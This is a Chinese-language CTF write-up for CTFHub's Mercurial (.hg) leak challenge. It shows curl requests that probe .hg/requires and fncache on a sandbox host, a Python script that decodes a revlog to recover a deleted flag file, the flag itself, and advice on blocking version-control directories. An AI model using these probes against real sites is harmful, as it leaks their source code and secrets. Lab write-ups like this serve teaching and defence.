CTFHub - Web - 信息泄露 - HG泄露

# CTFHub # Web # 信息泄露 # Mercurial # revlog

一、题目信息

  • 题目名称：HG泄露
  • 题目方向：Web - 信息泄露
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目提示：Mercurial 工作副本的 .hg 目录被直接部署到线上。
  • 题目目标：从 Mercurial 仓库元数据中恢复旧版本源码并获取 flag。

二、漏洞原理

Mercurial 使用 .hg 目录保存工作副本状态、版本日志和文件历史。带 store 格式的仓库通常使用 revlog 存储版本数据，文件名索引位于 .hg/store/fncache。

如果 Web 服务器没有拦截 .hg，攻击者可以直接下载 requires、fncache 和文件 revlog，从而确定历史文件名并恢复内容。部分环境甚至会直接暴露已被移除的源码文件。

三、探测泄露

先访问首页和仓库要求文件：

curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/"
curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.hg/requires"

/.hg/requires 返回了以下能力：

dotencode
fncache
generaldelta
revlogv1
sparserevlog
store

这说明仓库采用标准 store 与 revlog 格式，可以进一步读取文件名缓存：

curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.hg/store/fncache"

缓存中暴露了仓库使用的文件名：

data/index.html.i
data/50x.html.i
data/flag_676732105.txt.i

四、快速恢复文件

根据 fncache 可以还原逻辑文件名 flag_676732105.txt。本环境仍然允许直接访问该文件：

curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/flag_676732105.txt"

响应内容即为 flag：

ctfhub{573991d6f67c13a2b0e79ff7}

五、手工解析 revlog

如果目标文件已被删除，可继续分析对应的文件日志。Mercurial store 会把文件名中的特殊字符转义，下划线 _ 会写成 __，因此实际路径为：

/.hg/store/data/flag__676732105.txt.i

下载该 revlog 后，其大小只有 98 字节。revlogv1 的内联数据由 64 字节索引和随后的数据块组成。读取压缩长度并按首字节判断压缩方式即可恢复原始内容：

from pathlib import Path

raw = Path("flag__676732105.txt.i").read_bytes()
comp_len = int.from_bytes(raw[8:12], "big")
chunk = raw[64:64 + comp_len]

# b"u" 表示未经压缩的原始内容
if chunk[:1] == b"u":
    content = chunk[1:]
else:
    import zlib
    content = zlib.decompress(chunk)

print(content.decode())

脚本输出与快速恢复结果一致。

fncache 中保存的是逻辑文件名；转换为真实 store 路径时需要对特殊字符进行 store 编码。常见情况下下划线会变成双下划线。

六、最终 Flag

ctfhub{573991d6f67c13a2b0e79ff7}

七、修复建议

  • 禁止 Web 服务器访问 .hg、.git、.svn 等版本控制目录。
  • 部署时只发布构建产物，不要将完整工作副本暴露到 Web 根目录。
  • 使用 Nginx 或 Apache 显式拦截隐藏目录和版本控制元数据路径。
  • 敏感文件进入版本控制后，应立即轮换其中包含的密钥、密码或 flag。

八、解题总结

本题的关键是识别 .hg 泄露，并从 fncache 获取历史文件名。若源文件仍可直接访问，可立即取得 flag；若已被删除，则可下载对应 revlog，解析内联数据块恢复旧版本内容。
